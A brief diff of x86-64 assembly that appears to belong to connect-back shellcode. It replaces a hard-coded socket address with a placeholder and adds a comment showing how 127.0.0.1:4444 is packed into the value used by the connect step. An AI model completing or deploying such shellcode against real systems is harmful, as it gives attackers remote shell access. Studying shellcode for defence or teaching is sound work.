@@ -31,7 +31,7 @@
         xchg   rdi, rax
 
       connect:
-        mov    rcx, 0x100007f5c110002
+        mov    rcx, _SOCK_STRUCT_ ; 127.0.0.1:4444 => 0x01 00 00 7f 5c11 0002 => 0x100007f5c110002  
         push   rcx
         mov    rsi, rsp
         push   0x10
